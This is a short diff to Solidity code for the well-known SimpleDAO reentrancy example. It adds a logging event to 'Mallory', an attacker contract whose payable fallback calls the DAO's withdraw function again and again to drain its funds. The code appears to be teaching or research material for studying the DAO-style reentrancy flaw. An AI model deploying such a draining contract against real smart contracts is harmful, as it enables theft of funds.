@@ -17,13 +17,15 @@ contract SimpleDAO {
 }
 
 contract Mallory {
+    event LogCall(uint x);
 	SimpleDAO public dao;
 	address owner;
 	function Mallory(SimpleDAO _dao) {
 		dao = _dao;
 		owner = msg.sender; 
 	}
-	function() payable { 
+	function() payable {
+	    LogCall(this.balance);
 		dao.withdraw(dao.queryCredit(this)); 
 	}
 	function getJackpot() { 
